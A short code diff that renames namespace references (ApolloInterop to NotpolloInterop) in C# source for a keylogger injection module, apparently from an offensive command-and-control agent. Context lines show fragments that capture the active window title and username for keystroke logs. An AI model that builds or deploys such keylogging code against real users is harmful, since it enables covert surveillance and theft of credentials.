@@ -7,8 +7,8 @@ using System.Text;
 using System.Linq;
 using static KeylogInject.Native;
 using System.Threading;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Structs.ApolloStructs;
+using NotpolloInterop.Classes.Collections;
+using NotpolloInterop.Structs.NotpolloStructs;
 using static KeylogInject.Delegates;
 
 namespace KeylogInject
@@ -400,7 +400,7 @@ namespace KeylogInject
                                 GetWindowText(hWindow, title, title.Capacity);
                         
 
-                            LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
+                            LogMessage(new NotpolloInterop.Structs.MythicStructs.KeylogInformation
                             {
                                 Username = Username,
                                 WindowTitle = title.ToString(),
